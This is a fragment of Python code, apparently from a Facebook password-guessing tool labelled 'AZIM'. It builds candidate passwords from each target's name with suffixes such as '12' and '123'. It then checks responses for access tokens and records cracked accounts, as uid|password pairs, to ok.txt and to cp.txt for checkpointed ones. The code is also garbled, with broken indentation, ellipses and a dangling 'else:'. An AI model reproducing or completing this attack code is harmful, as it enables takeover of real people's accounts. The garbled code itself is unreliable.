								...
								if "www.facebook.com" in q["error_msg"]:
									...
									if "access_token" in q and "EAAA" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											pass5 = name.lower().split(' ')[0] + name.lower().split(' ')[1] + '1'
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q and "EAAA" in q:
															    ...
															    if "www.facebook.com" in q["error_msg"]:
																	...
																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1] + '12'
																	...
																	pass9 = name.lower().split(' ')[0] + name.lower().split(' ')[1] + '123'
																	...
																	if "access_token" in q and "EAAA" in q:
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [AZIM-CP] "+uid+" | "+pass9+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass9+"\n")
																			cp.close()
																			cps.append(uid+pass9)
																			else:
																	pass10 = name.lower() + '12'
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [AZIM-OK] "+uid+" | "+pass10+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass10+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [AZIM-CP] "+uid+" | "+pass10+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass10+"\n")
																			cp.close()
